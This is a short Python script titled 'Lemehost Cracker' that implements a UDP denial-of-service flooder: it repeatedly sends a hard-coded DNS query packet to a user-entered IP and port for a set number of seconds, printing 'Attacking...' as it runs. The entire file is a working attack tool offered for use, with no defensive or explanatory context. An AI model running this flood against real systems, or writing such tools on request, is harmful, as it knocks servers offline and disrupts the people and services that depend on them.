import socket
from time import time as tt
from cfonts import render, say

output = render('Lemehost Cracker', colors=['red', 'yellow'], align='center', font='chrome')
print(output)

def DNS_attack(ip, port, time):
    data = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01'
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(ip), int(port))
    startup = tt()
    while True:
        endtime = tt()
        if (startup + time) < endtime:
            break
        s.sendto(data, addr)

if __name__ == '__main__':
    try:
        ip = str(input("[+]IP : "))
        port = int(input("[+]Port : "))
        time = int(input("[+]Time : "))
        print("Attacking...")
        DNS_attack(ip, port, time)
    except KeyboardInterrupt:
        print("\033[32mAttack stopped.")
